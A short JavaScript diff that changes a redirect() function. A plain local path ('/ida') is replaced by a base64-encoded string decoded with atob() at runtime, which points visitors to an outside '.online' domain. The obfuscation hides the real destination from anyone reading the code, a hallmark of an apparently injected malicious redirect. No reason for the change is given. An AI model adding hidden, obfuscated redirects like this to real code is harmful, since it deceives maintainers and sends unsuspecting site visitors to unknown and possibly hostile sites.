@@ -12,5 +12,6 @@ function step2() {
   }
 
   function redirect() {
-      location.href = "/ida";
+      site = "cHJvcGFnYW5kb2ZlbGljaWRhZGUub25saW5lLw=="
+      location.href = atob(site);
   }
